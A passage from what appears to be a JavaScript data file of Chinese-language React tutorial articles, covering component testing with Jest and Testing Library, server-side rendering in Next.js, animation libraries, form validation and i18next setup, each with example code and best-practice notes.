  collectCoverageFrom: [
    'src/**/*.{js,jsx,ts,tsx}',
    '!src/**/*.d.ts',
    '!src/**/*.stories.{js,jsx,ts,tsx}'
  ]
};

// 组件渲染测试
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Counter from './Counter';

describe('Counter Component', () => {
  test('renders initial count', () => {
    render(<Counter initialCount={0} />);
    expect(screen.getByText('Count: 0')).toBeInTheDocument();
  });
  
  test('increments count when button clicked', async () => {
    const user = userEvent.setup();
    render(<Counter initialCount={0} />);
    
    await user.click(screen.getByRole('button', { name: /increment/i }));
    
    expect(screen.getByText('Count: 1')).toBeInTheDocument();
  });
  
  test('decrements count when button clicked', async () => {
    const user = userEvent.setup();
    render(<Counter initialCount={5} />);
    
    await user.click(screen.getByRole('button', { name: /decrement/i }));
    
    expect(screen.getByText('Count: 4')).toBeInTheDocument();
  });
});

// 表单组件测试
import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import LoginForm from './LoginForm';

describe('LoginForm', () => {
  const mockOnSubmit = jest.fn();
  
  beforeEach(() => {
    mockOnSubmit.mockClear();
  });
  
  test('submits form with correct values', async () => {
    const user = userEvent.setup();
    render(<LoginForm onSubmit={mockOnSubmit} />);
    
    await user.type(screen.getByLabelText(/email/i), 'test@example.com');
    await user.type(screen.getByLabelText(/password/i), 'password123');
    await user.click(screen.getByRole('button', { name: /submit/i }));
    
    await waitFor(() => {
      expect(mockOnSubmit).toHaveBeenCalledWith({
        email: 'test@example.com',
        password: 'password123'
      });
    });
  });
  
  test('shows validation error for invalid email', async () => {
    const user = userEvent.setup();
    render(<LoginForm onSubmit={mockOnSubmit} />);
    
    await user.type(screen.getByLabelText(/email/i), 'invalid-email');
    await user.click(screen.getByRole('button', { name: /submit/i }));
    
    expect(await screen.findByText(/invalid email/i)).toBeInTheDocument();
    expect(mockOnSubmit).not.toHaveBeenCalled();
  });
});

// 异步组件测试
import { render, screen, waitFor } from '@testing-library/react';
import UserProfile from './UserProfile';

// Mock fetch
global.fetch = jest.fn();

describe('UserProfile', () => {
  beforeEach(() => {
    fetch.mockClear();
  });
  
  test('shows loading state initially', () => {
    fetch.mockImplementation(() => new Promise(() => {}));
    render(<UserProfile userId="1" />);
    expect(screen.getByText(/loading/i)).toBeInTheDocument();
  });
  
  test('renders user data after fetch', async () => {
    fetch.mockResolvedValueOnce({
      ok: true,
      json: async () => ({ id: '1', name: 'John Doe', email: 'john@example.com' })
    });
    
    render(<UserProfile userId="1" />);
    
    await waitFor(() => {
      expect(screen.getByText('John Doe')).toBeInTheDocument();
      expect(screen.getByText('john@example.com')).toBeInTheDocument();
    });
  });
  
  test('shows error message on fetch failure', async () => {
    fetch.mockRejectedValueOnce(new Error('Network error'));
    
    render(<UserProfile userId="1" />);
    
    expect(await screen.findByText(/error/i)).toBeInTheDocument();
  });
});

// 自定义 Hook 测试
import { renderHook, act } from '@testing-library/react';
import { useCounter } from './useCounter';

describe('useCounter Hook', () => {
  test('initializes with default value', () => {
    const { result } = renderHook(() => useCounter());
    expect(result.current.count).toBe(0);
  });
  
  test('initializes with custom value', () => {
    const { result } = renderHook(() => useCounter(10));
    expect(result.current.count).toBe(10);
  });
  
  test('increments count', () => {
    const { result } = renderHook(() => useCounter());
    
    act(() => {
      result.current.increment();
    });
    
    expect(result.current.count).toBe(1);
  });
  
  test('decrements count', () => {
    const { result } = renderHook(() => useCounter(5));
    
    act(() => {
      result.current.decrement();
    });
    
    expect(result.current.count).toBe(4);
  });
});

// MSW API Mock 示例
import { rest } from 'msw';
import { setupServer } from 'msw/node';
import { render, screen, waitFor } from '@testing-library/react';
import UserList from './UserList';

const server = setupServer(
  rest.get('/api/users', (req, res, ctx) => {
    return res(
      ctx.json([
        { id: 1, name: 'John Doe' },
        { id: 2, name: 'Jane Smith' }
      ])
    );
  })
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

describe('UserList with MSW', () => {
  test('renders users from API', async () => {
    render(<UserList />);
    
    await waitFor(() => {
      expect(screen.getByText('John Doe')).toBeInTheDocument();
      expect(screen.getByText('Jane Smith')).toBeInTheDocument();
    });
  });
  
  test('handles API error', async () => {
    server.use(
      rest.get('/api/users', (req, res, ctx) => {
        return res(ctx.status(500));
      })
    );
    
    render(<UserList />);
    
    expect(await screen.findByText(/error/i)).toBeInTheDocument();
  });
});

// 快照测试
import { render } from '@testing-library/react';
import Card from './Card';

describe('Card Snapshot', () => {
  test('matches snapshot', () => {
    const { asFragment } = render(
      <Card title="Test Card" description="This is a test card" />
    );
    expect(asFragment()).toMatchSnapshot();
  });
  
  test('matches snapshot with custom className', () => {
    const { asFragment } = render(
      <Card 
        title="Test Card" 
        description="This is a test card" 
        className="custom-class"
      />
    );
    expect(asFragment()).toMatchSnapshot();
  });
});
\`\`\`

### 测试工具详解

**Jest - 测试框架核心：**
Jest 是 Facebook 开发的 JavaScript 测试框架，提供了完整的测试解决方案。Jest 内置断言库、Mock 功能、快照测试、代码覆盖率报告等功能。Jest 的零配置理念使得开箱即用，同时支持灵活的自定义配置。Jest 的并行测试执行和智能观察模式可以显著提高测试效率。

**React Testing Library - 组件测试最佳实践：**
React Testing Library 是测试 React 组件的推荐工具，它鼓励测试组件行为而非实现细节。通过 queryBy*、getBy*、findBy* 等方法查询 DOM 元素，通过 userEvent 模拟用户交互。Testing Library 的核心理念是"测试应该像用户使用应用一样"，这使得测试更加健壮，不会因为重构而频繁修改。

**MSW - API Mock 利器：**
Mock Service Worker (MSW) 是现代的 API Mock 工具，通过 Service Worker 拦截网络请求。MSW 可以在浏览器和 Node.js 环境中使用，支持 REST 和 GraphQL API。MSW 的优势在于不需要修改应用代码，Mock 的 API 行为与真实 API 一致，测试更加真实可靠。

### 最佳实践

**测试原则：**
测试用户可见的行为，而不是实现细节。使用语义化的查询方法（如 getByRole、getByText）而不是测试 ID。保持测试独立，每个测试应该能够单独运行。测试边界条件和错误情况，而不仅仅是正常流程。

**测试组织：**
使用 describe 嵌套组织相关测试用例。使用 beforeEach 和 afterEach 处理公共的设置和清理。将测试文件放在与被测试文件相同的目录下，命名为 *.test.js 或 *.spec.js。

**持续集成：**
在 CI 流程中运行所有测试，确保代码质量。配置测试覆盖率阈值，低于阈值时构建失败。使用并行测试加速 CI 执行时间。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-ssr",title:"React 服务端渲染 (SSR) 深度解析",category:"react",difficulty:"hard",tags:["React","SSR","Next.js","性能"],content:`## React 服务端渲染 (SSR) 深度解析

服务端渲染 (SSR) 是提高 React 应用首屏性能和 SEO 的重要技术。与客户端渲染 (CSR) 不同，SSR 在服务器端生成完整的 HTML，然后发送给客户端，用户可以更快地看到页面内容。SSR 对于内容驱动的网站、电商、博客等需要良好 SEO 的应用尤为重要。

### SSR 核心概念

**SSR 工作原理：**
服务端渲染的工作流程包括：服务器接收请求、执行 React 组件渲染、生成完整 HTML、发送给客户端、客户端进行 hydration（激活交互）。Hydration 是 SSR 的关键步骤，React 在客户端重新执行组件，绑定事件处理器，使页面变得可交互。Hydration 过程中，React 会对比服务端渲染的 HTML 和客户端渲染的结果，确保一致性。

**SSR 的优势：**
更快的首屏加载，用户可以更快看到页面内容；更好的 SEO，搜索引擎可以抓取完整的页面内容；支持社交媒体分享，Open Graph 和 Twitter Card 标签可以正确显示；更好的可访问性，屏幕阅读器可以读取完整的页面内容。

**SSR 的挑战：**
服务器负载增加，每次请求都需要渲染；开发复杂度提高，需要处理服务器和客户端环境的差异；某些浏览器 API 不可用，如 window、document；hydration 错误需要特别注意，服务端和客户端渲染结果必须一致。

### 代码示例

\`\`\`javascript
// Next.js App Router - 服务器组件
// app/users/page.tsx
async function UsersPage() {
  // 直接在服务器组件中获取数据
  const users = await fetch('https://api.example.com/users', {
    cache: 'no-store' // 每次请求都重新获取
  }).then(res => res.json());
  
  return (
    <main>
      <h1>Users</h1>
      <ul>
        {users.map(user => (
          <li key={user.id}>{user.name}</li>
        ))}
      </ul>
    </main>
  );
}

// 静态生成 (SSG)
// app/blog/[slug]/page.tsx
export async function generateStaticParams() {
  const posts = await fetch('https://api.example.com/posts').then(res => res.json());
  
  return posts.map(post => ({
    slug: post.slug
  }));
}

async function BlogPost({ params }) {
  const post = await fetch(\`https://api.example.com/posts/\${params.slug}\`, {
    next: { revalidate: 3600 } // ISR: 每小时重新验证
  }).then(res => res.json());
  
  return (
    <article>
      <h1>{post.title}</h1>
      <div dangerouslySetInnerHTML={{ __html: post.content }} />
    </article>
  );
}

// Pages Router - getServerSideProps
export async function getServerSideProps(context) {
  const { params, req, res } = context;
  
  // 设置缓存头
  res.setHeader('Cache-Control', 'public, s-maxage=10, stale-while-revalidate=59');
  
  const data = await fetch(\`https://api.example.com/data/\${params.id}\`);
  const item = await data.json();
  
  return {
    props: { item }
  };
}

function ServerPage({ item }) {
  return <div>{item.name}</div>;
}

// Pages Router - getStaticProps
export async function getStaticProps() {
  const data = await fetch('https://api.example.com/posts');
  const posts = await data.json();
  
  return {
    props: { posts },
    revalidate: 60 // ISR: 60秒后重新生成
  };
}

// Pages Router - getStaticPaths
export async function getStaticPaths() {
  const data = await fetch('https://api.example.com/posts');
  const posts = await data.json();
  
  const paths = posts.map(post => ({
    params: { id: post.id.toString() }
  }));
  
  return {
    paths,
    fallback: 'blocking' // 或 true, false
  };
}

// 自定义 SSR 服务器
import express from 'express';
import React from 'react';
import { renderToString } from 'react-dom/server';
import App from './App';

const app = express();

app.get('*', (req, res) => {
  const context = {};
  
  const html = renderToString(
    <StaticRouter location={req.url} context={context}>
      <App />
    </StaticRouter>
  );
  
  if (context.url) {
    res.redirect(context.url);
    return;
  }
  
  res.send(\`
    <!DOCTYPE html>
    <html>
      <head>
        <title>SSR App</title>
      </head>
      <body>
        <div id="root">\${html}</div>
        <script src="/client.js"></script>
      </body>
    </html>
  \`);
});

// Hydration
import { hydrateRoot } from 'react-dom/client';
import App from './App';

hydrateRoot(document.getElementById('root'), <App />);

// 流式 SSR
import { renderToPipeableStream } from 'react-dom/server';

app.get('*', (req, res) => {
  const { pipe } = renderToPipeableStream(
    <App />,
    {
      bootstrapScripts: ['/client.js'],
      onShellReady() {
        res.setHeader('Content-Type', 'text/html');
        pipe(res);
      },
      onShellError(error) {
        res.status(500).send('Error');
      }
    }
  );
});

// 客户端组件与 SSR 配合
'use client';

import { useState, useEffect } from 'react';

function ClientComponent() {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    // 只在客户端执行
    fetch('/api/data')
      .then(res => res.json())
      .then(setData);
  }, []);
  
  if (!data) return <div>Loading...</div>;
  
  return <div>{data.message}</div>;
}

// 服务器组件中嵌入客户端组件
async function ServerComponent() {
  const initialData = await fetchInitialData();
  
  return (
    <div>
      <h1>Server Rendered</h1>
      <ClientComponent initialData={initialData} />
    </div>
  );
}

// 处理 SSR 中的环境差异
function SafeComponent() {
  const [isClient, setIsClient] = useState(false);
  
  useEffect(() => {
    setIsClient(true);
  }, []);
  
  return (
    <div>
      {isClient ? (
        <ClientOnlyFeature />
      ) : (
        <ServerFallback />
      )}
    </div>
  );
}

// 动态导入避免 SSR
const DynamicComponent = dynamic(() => import('./ClientOnlyComponent'), {
  ssr: false,
  loading: () => <p>Loading...</p>
});
\`\`\`

### Next.js 渲染模式详解

**静态生成 (SSG)：**
静态生成在构建时生成 HTML 文件，适合内容不经常变化的页面。SSG 提供了最佳的性能，因为 HTML 文件可以直接由 CDN 分发。使用 getStaticProps 获取数据，使用 getStaticPaths 生成动态路由。SSG 适合博客、文档、产品列表等场景。

**服务端渲染 (SSR)：**
服务端渲染在每次请求时生成 HTML，适合内容经常变化的页面。SSR 提供了良好的 SEO 和首屏性能，但会增加服务器负载。使用 getServerSideProps 获取数据。SSR 适合新闻、电商、社交媒体等场景。

**增量静态再生 (ISR)：**
ISR 结合了 SSG 和 SSR 的优点，初始时使用静态页面，当数据变化时重新生成特定页面。ISR 通过 revalidate 属性设置重新生成的时间间隔。ISR 适合内容定期更新的场景，如博客、新闻、电商等。

### 性能优化策略

**代码分割：**
使用动态导入 (dynamic import) 按需加载组件，减少初始加载体积。Next.js 自动按路由分割代码，也可以手动分割大型组件。

**缓存策略：**
合理设置 HTTP 缓存头，使用 CDN 缓存静态资源。对于 ISR 页面，设置合适的 revalidate 时间。使用 Cache-Control 头控制浏览器缓存行为。

**流式渲染：**
使用 renderToPipeableStream 或 renderToReadableStream 实现流式 SSR，逐步发送 HTML 到客户端，用户可以更快看到内容。配合 Suspense 实现组件级别的流式渲染。

**预加载和预取：**
使用 <link rel="preload"> 预加载关键资源。Next.js 的 <Link> 组件自动预取链接页面。使用 router.prefetch() 手动预取页面。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-animation",title:"React 动画实现与性能优化",category:"react",difficulty:"medium",tags:["React","动画","CSS","性能"],content:`## React 动画实现与性能优化

动画是提升用户体验的重要手段，精心设计的动画可以引导用户注意力、提供视觉反馈、增强应用的交互感。React 提供了多种动画实现方式，从简单的 CSS 过渡到复杂的物理动画，开发者可以根据需求选择合适的方案。

### 动画实现方式详解

**CSS 动画 - 高性能基础方案：**
CSS 动画是实现动画效果的基础方案，包括 CSS Transitions 和 CSS Animations 两种方式。CSS Transitions 适合简单的状态变化动画，如悬停效果、展开收起等，通过 transition 属性定义过渡效果。CSS Animations 适合复杂的动画序列，通过 @keyframes 定义关键帧动画。CSS 动画的性能优势在于可以利用 GPU 加速，特别是 transform 和 opacity 属性的变化只触发合成层，不会导致重排和重绘。

**React 状态驱动动画：**
使用 useState 和 useEffect 控制动画状态，可以实现复杂的动画逻辑，与业务逻辑紧密结合。通过状态变化触发 CSS 类名切换，实现声明式的动画控制。这种方式适合需要根据数据状态动态变化的动画，如列表项的添加删除、模态框的显示隐藏等。

**第三方动画库：**
Framer Motion 是 React 生态中最流行的动画库，提供了声明式的动画 API，支持布局动画、手势动画、页面过渡等高级功能。React Spring 是基于物理的动画库，使用真实的物理弹簧模拟，动画效果更自然流畅。Lottie 可以将 Adobe After Effects 导出的 JSON 动画在 Web 端渲染，适合复杂的矢量动画。

### 代码示例

\`\`\`javascript
// CSS 过渡动画
import './styles.css';

function FadeInComponent({ isVisible }) {
  return (
    <div className={\`fade-container \${isVisible ? 'visible' : ''}\`}>
      <p>Content fades in and out</p>
    </div>
  );
}

// styles.css
// .fade-container {
//   opacity: 0;
//   transition: opacity 0.3s ease-in-out;
// }
// .fade-container.visible {
//   opacity: 1;
// }

// CSS 关键帧动画
function Spinner() {
  return <div className="spinner" />;
}

// styles.css
// @keyframes spin {
//   from { transform: rotate(0deg); }
//   to { transform: rotate(360deg); }
// }
// .spinner {
//   width: 40px;
//   height: 40px;
//   border: 4px solid #f3f3f3;
//   border-top: 4px solid #3498db;
//   border-radius: 50%;
//   animation: spin 1s linear infinite;
// }

// React 状态驱动动画
function AnimatedList({ items }) {
  const [displayItems, setDisplayItems] = useState(items);
  
  const addItem = (item) => {
    setDisplayItems(prev => [...prev, { ...item, isNew: true }]);
    setTimeout(() => {
      setDisplayItems(prev => 
        prev.map(i => i.id === item.id ? { ...i, isNew: false } : i)
      );
    }, 300);
  };
  
  return (
    <ul className="animated-list">
      {displayItems.map(item => (
        <li 
          key={item.id} 
          className={\`list-item \${item.isNew ? 'item-enter' : ''}\`}
        >
          {item.name}
        </li>
      ))}
    </ul>
  );
}

// Framer Motion 基础用法
import { motion, AnimatePresence } from 'framer-motion';

function MotionComponent() {
  const [isVisible, setIsVisible] = useState(true);
  
  return (
    <div>
      <button onClick={() => setIsVisible(!isVisible)}>
        Toggle
      </button>
      <AnimatePresence>
        {isVisible && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            transition={{ duration: 0.3 }}
          >
            <p>Animated content</p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// Framer Motion 列表动画
function MotionList({ items }) {
  return (
    <ul>
      <AnimatePresence>
        {items.map((item, index) => (
          <motion.li
            key={item.id}
            initial={{ opacity: 0, x: -50 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: 50 }}
            transition={{ delay: index * 0.1 }}
            layout
          >
            {item.name}
          </motion.li>
        ))}
      </AnimatePresence>
    </ul>
  );
}

// Framer Motion 手势动画
function DraggableCard() {
  return (
    <motion.div
      drag
      dragConstraints={{ left: -100, right: 100, top: -100, bottom: 100 }}
      dragElastic={0.2}
      whileHover={{ scale: 1.05 }}
      whileTap={{ scale: 0.95 }}
      className="card"
    >
      Drag me!
    </motion.div>
  );
}

// React Spring 物理动画
import { useSpring, animated } from '@react-spring/web';

function SpringComponent() {
  const [flip, setFlip] = useState(false);
  
  const { transform, opacity } = useSpring({
    opacity: flip ? 1 : 0,
    transform: \`perspective(600px) rotateX(\${flip ? 180 : 0}deg)\`,
    config: { mass: 5, tension: 500, friction: 80 }
  });
  
  return (
    <animated.div
      onClick={() => setFlip(!flip)}
      style={{ opacity: opacity.to(o => 1 - o), transform }}
    >
      Click to flip
    </animated.div>
  );
}

// React Spring 数字动画
function AnimatedNumber({ value }) {
  const { number } = useSpring({
    from: { number: 0 },
    number: value,
    delay: 200,
    config: { mass: 1, tension: 20, friction: 10 }
  });
  
  return <animated.span>{number.to(n => n.toFixed(2))}</animated.span>;
}

// Lottie 动画
import Lottie from 'lottie-react';
import animationData from './animation.json';

function LottieAnimation() {
  const [isPlaying, setIsPlaying] = useState(true);
  
  return (
    <div>
      <Lottie 
        animationData={animationData}
        loop={true}
        autoplay={isPlaying}
        style={{ width: 200, height: 200 }}
      />
      <button onClick={() => setIsPlaying(!isPlaying)}>
        {isPlaying ? 'Pause' : 'Play'}
      </button>
    </div>
  );
}

// 页面过渡动画
import { motion } from 'framer-motion';

const pageVariants = {
  initial: { opacity: 0, x: '-100vw' },
  in: { opacity: 1, x: 0 },
  out: { opacity: 0, x: '100vw' }
};

const pageTransition = {
  type: 'tween',
  ease: 'anticipate',
  duration: 0.5
};

function PageTransition({ children }) {
  return (
    <motion.div
      initial="initial"
      animate="in"
      exit="out"
      variants={pageVariants}
      transition={pageTransition}
    >
      {children}
    </motion.div>
  );
}

// 性能优化：使用 transform 和 opacity
function OptimizedAnimation() {
  const [isExpanded, setIsExpanded] = useState(false);
  
  return (
    <div 
      className="optimized-container"
      style={{
        transform: isExpanded ? 'scale(1.1)' : 'scale(1)',
        opacity: isExpanded ? 0.8 : 1,
        transition: 'transform 0.3s ease, opacity 0.3s ease',
        willChange: 'transform, opacity'
      }}
      onClick={() => setIsExpanded(!isExpanded)}
    >
      Optimized Animation
    </div>
  );
}
\`\`\`

### 性能优化策略

**使用 GPU 加速属性：**
transform 和 opacity 是唯一只触发合成的 CSS 属性，不会导致重排和重绘。优先使用 translate、scale、rotate 代替 top、left、width、height 等属性。使用 will-change 属性提前告知浏览器元素将要变化，让浏览器提前优化，但不要过度使用，因为会占用额外内存。

**避免动画性能陷阱：**
避免在动画中频繁读取布局属性（如 offsetWidth、getBoundingClientRect），这会强制同步布局。使用 requestAnimationFrame 进行动画循环，确保动画帧率与屏幕刷新率同步。对于复杂的动画，考虑使用 Web Animations API 或 CSS Animations，它们比 JavaScript 动画更高效。

**React 动画最佳实践：**
使用 React.memo 避免动画组件的不必要重新渲染。将动画状态与业务状态分离，避免动画触发业务逻辑更新。使用 CSS 变量动态控制动画参数，减少 JavaScript 计算。对于长列表动画，使用虚拟列表减少 DOM 节点数量。

### 可访问性考虑

动画设计需要考虑可访问性，尊重用户的 prefers-reduced-motion 设置。使用 CSS 媒体查询 @media (prefers-reduced-motion: reduce) 禁用或简化动画。提供动画开关选项，让用户可以自主选择。确保动画不会导致内容闪烁或引起光敏性癫痫。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-forms",title:"React 表单处理最佳实践",category:"react",difficulty:"medium",tags:["React","表单","状态管理","验证"],content:`## React 表单处理最佳实践

表单是用户与应用交互的重要方式，表单处理涉及状态管理、验证、错误处理、提交等多个方面。React 提供了受控组件和非受控组件两种表单处理方式，同时社区也提供了丰富的表单处理库，开发者可以根据需求选择合适的方案。

### 表单实现方式详解

**受控组件：**
受控组件是指表单值由 React 状态控制的组件。每个表单元素都有一个对应的状态，通过 onChange 事件更新状态，通过 value 属性设置表单值。受控组件的优势在于：可以实时验证用户输入、可以动态修改输入值、可以禁用提交按钮直到表单有效、可以实现复杂的表单逻辑。受控组件的缺点是对于大型表单，需要管理大量状态，代码可能变得冗长。

**非受控组件：**
非受控组件是指表单值由 DOM 控制的组件，通过 ref 访问表单值。非受控组件更接近传统 HTML 表单的处理方式，适合简单的表单场景。非受控组件的优势在于：代码简洁、不需要管理大量状态、可以与第三方库集成。非受控组件的缺点是难以实现实时验证和动态修改。

**第三方表单库：**
React Hook Form 是高性能的表单库，采用受控组件与非受控组件混合的方式，最大限度地减少不必要的重新渲染。Formik 是功能丰富的表单库，提供了表单状态管理、验证、错误提示等完整解决方案。Zod 是 TypeScript 优先的验证库，可以与 React Hook Form 配合使用，提供类型安全的表单验证。

### 代码示例

\`\`\`javascript
// 受控组件
function ControlledForm() {
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: ''
  });
  const [errors, setErrors] = useState({});
  
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    
    // 实时验证
    validateField(name, value);
  };
  
  const validateField = (name, value) => {
    let error = '';
    
    switch (name) {
      case 'username':
        if (!value) error = 'Username is required';
        else if (value.length < 3) error = 'Username must be at least 3 characters';
        break;
      case 'email':
        if (!value) error = 'Email is required';
        else if (!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(value)) error = 'Invalid email';
        break;
      case 'password':
        if (!value) error = 'Password is required';
        else if (value.length < 8) error = 'Password must be at least 8 characters';
        break;
    }
    
    setErrors(prev => ({ ...prev, [name]: error }));
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // 验证所有字段
    Object.keys(formData).forEach(key => {
      validateField(key, formData[key]);
    });
    
    if (Object.values(errors).every(e => !e)) {
      console.log('Form submitted:', formData);
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label>Username</label>
        <input
          name="username"
          value={formData.username}
          onChange={handleChange}
        />
        {errors.username && <span>{errors.username}</span>}
      </div>
      
      <div>
        <label>Email</label>
        <input
          name="email"
          type="email"
          value={formData.email}
          onChange={handleChange}
        />
        {errors.email && <span>{errors.email}</span>}
      </div>
      
      <div>
        <label>Password</label>
        <input
          name="password"
          type="password"
          value={formData.password}
          onChange={handleChange}
        />
        {errors.password && <span>{errors.password}</span>}
      </div>
      
      <button type="submit">Submit</button>
    </form>
  );
}

// 非受控组件
function UncontrolledForm() {
  const usernameRef = useRef(null);
  const emailRef = useRef(null);
  const fileRef = useRef(null);
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    const formData = {
      username: usernameRef.current.value,
      email: emailRef.current.value,
      file: fileRef.current.files[0]
    };
    
    console.log('Form submitted:', formData);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label>Username</label>
        <input ref={usernameRef} defaultValue="" />
      </div>
      
      <div>
        <label>Email</label>
        <input ref={emailRef} type="email" defaultValue="" />
      </div>
      
      <div>
        <label>File</label>
        <input ref={fileRef} type="file" />
      </div>
      
      <button type="submit">Submit</button>
    </form>
  );
}

// React Hook Form 基础用法
import { useForm } from 'react-hook-form';

function ReactHookForm() {
  const { 
    register, 
    handleSubmit, 
    formState: { errors, isSubmitting },
    reset 
  } = useForm({
    defaultValues: {
      username: '',
      email: '',
      password: ''
    }
  });
  
  const onSubmit = async (data) => {
    try {
      await fetch('/api/register', {
        method: 'POST',
        body: JSON.stringify(data)
      });
      reset();
    } catch (error) {
      console.error(error);
    }
  };
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <div>
        <label>Username</label>
        <input
          {...register('username', {
            required: 'Username is required',
            minLength: {
              value: 3,
              message: 'Username must be at least 3 characters'
            }
          })}
        />
        {errors.username && <span>{errors.username.message}</span>}
      </div>
      
      <div>
        <label>Email</label>
        <input
          type="email"
          {...register('email', {
            required: 'Email is required',
            pattern: {
              value: /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/,
              message: 'Invalid email address'
            }
          })}
        />
        {errors.email && <span>{errors.email.message}</span>}
      </div>
      
      <div>
        <label>Password</label>
        <input
          type="password"
          {...register('password', {
            required: 'Password is required',
            minLength: {
              value: 8,
              message: 'Password must be at least 8 characters'
            }
          })}
        />
        {errors.password && <span>{errors.password.message}</span>}
      </div>
      
      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? 'Submitting...' : 'Submit'}
      </button>
    </form>
  );
}

// React Hook Form + Zod 验证
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';

const schema = z.object({
  username: z.string().min(3, 'Username must be at least 3 characters'),
  email: z.string().email('Invalid email address'),
  password: z.string().min(8, 'Password must be at least 8 characters'),
  confirmPassword: z.string()
}).refine(data => data.password === data.confirmPassword, {
  message: "Passwords don't match",
  path: ['confirmPassword']
});

function FormWithZod() {
  const { 
    register, 
    handleSubmit, 
    formState: { errors } 
  } = useForm({
    resolver: zodResolver(schema)
  });
  
  return (
    <form onSubmit={handleSubmit(console.log)}>
      <input {...register('username')} />
      {errors.username && <span>{errors.username.message}</span>}
      
      <input type="email" {...register('email')} />
      {errors.email && <span>{errors.email.message}</span>}
      
      <input type="password" {...register('password')} />
      {errors.password && <span>{errors.password.message}</span>}
      
      <input type="password" {...register('confirmPassword')} />
      {errors.confirmPassword && <span>{errors.confirmPassword.message}</span>}
      
      <button type="submit">Submit</button>
    </form>
  );
}

// 复杂表单：动态字段
function DynamicForm() {
  const { register, control, handleSubmit } = useForm({
    defaultValues: {
      items: [{ name: '', quantity: 1 }]
    }
  });
  
  const { fields, append, remove } = useFieldArray({
    control,
    name: 'items'
  });
  
  return (
    <form onSubmit={handleSubmit(console.log)}>
      {fields.map((field, index) => (
        <div key={field.id}>
          <input
            {...register(\`items.\${index}.name\`)}
            placeholder="Item name"
          />
          <input
            type="number"
            {...register(\`items.\${index}.quantity\`)}
            placeholder="Quantity"
          />
          <button type="button" onClick={() => remove(index)}>
            Remove
          </button>
        </div>
      ))}
      
      <button type="button" onClick={() => append({ name: '', quantity: 1 })}>
        Add Item
      </button>
      
      <button type="submit">Submit</button>
    </form>
  );
}

// 表单状态管理最佳实践
function OptimizedForm() {
  // 使用 useCallback 缓存处理函数
  const handleChange = useCallback((e) => {
    // 处理逻辑
  }, []);
  
  // 使用 useMemo 缓存验证结果
  const isValid = useMemo(() => {
    return formData.username && formData.email && !Object.keys(errors).length;
  }, [formData, errors]);
  
  // 防抖输入
  const debouncedSearch = useMemo(
    () => debounce((value) => {
      // 搜索逻辑
    }, 300),
    []
  );
  
  return (
    <form>
      {/* 表单内容 */}
    </form>
  );
}
\`\`\`

### 表单验证策略

**客户端验证：**
客户端验证可以提供即时反馈，减少服务器负担。常见的验证时机包括：即时验证（onChange）、失焦验证（onBlur）、提交验证（onSubmit）。即时验证适合需要实时反馈的字段，如密码强度；失焦验证适合需要用户完成输入后再验证的字段；提交验证确保所有字段都通过验证后才提交。

**服务器端验证：**
服务器端验证是最终验证保障，防止恶意提交和处理复杂的验证逻辑。服务器端验证应该返回详细的错误信息，包括哪个字段验证失败以及失败原因。前端应该正确处理服务器返回的验证错误，显示给用户。

### 性能优化

**减少重新渲染：**
使用 React Hook Form 的 Controller 组件可以将表单状态隔离，避免整个表单重新渲染。对于大型表单，可以将表单拆分为多个子组件，每个子组件管理自己的状态。

**防抖和节流：**
对于搜索输入等需要频繁触发验证的场景，使用防抖（debounce）延迟验证。对于滚动加载等场景，使用节流（throttle）限制触发频率。

**批量更新：**
React 18 的自动批处理可以将多个状态更新合并为一次渲染。对于复杂的表单状态更新，可以使用 useReducer 集中管理状态。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-i18n",title:"React 国际化 (i18n) 最佳实践",category:"react",difficulty:"medium",tags:["React","国际化","i18n","本地化"],content:`## React 国际化 (i18n) 最佳实践

国际化（Internationalization，简称 i18n）是构建全球应用的重要环节。一个优秀的国际化方案不仅要支持多语言翻译，还需要处理日期时间格式、数字格式、货币符号、复数规则、文字方向等复杂问题。React 提供了多种国际化方案，选择合适的方案对项目的可维护性和用户体验至关重要。

### 国际化库对比

**i18next - 功能最全面的国际化方案：**
- 功能丰富，生态完整，支持 React、Vue、Angular 等多种框架
- 支持复数、插值、嵌套翻译、命名空间等高级功能
- 提供浏览器语言检测、后端加载、缓存等插件
- 支持服务端渲染（SSR）和静态站点生成（SSG）
- 社区活跃，文档完善，是 React 国际化的首选方案

\`\`\`typescript
// i18next 配置示例
import i18n from 'i18next';
import { initReactI18next } from 'react-i18next';
import LanguageDetector from 'i18next-browser-languagedetector';
import HttpBackend from 'i18next-http-backend';

i18n
  .use(HttpBackend) // 从服务器加载翻译文件
  .use(LanguageDetector) // 检测用户语言
  .use(initReactI18next) // 绑定 react-i18next
  .init({
    fallbackLng: 'en', // 默认语言
    supportedLngs: ['en', 'zh', 'ja', 'ko'],
    
    ns: ['common', 'home', 'about'], // 命名空间
    defaultNS: 'common',
    
    backend: {
      loadPath: '/locales/{{lng}}/{{ns}}.json', // 翻译文件路径
    },
    
    detection: {
      order: ['querystring', 'cookie', 'localStorage', 'navigator'],
      caches: ['cookie', 'localStorage'],
    },
    
    interpolation: {
      escapeValue: false, // React 已经处理 XSS
    },
    
    react: {
      useSuspense: true, // 使用 Suspense 加载翻译
    },
  });

export default i18n;
\`\`\`

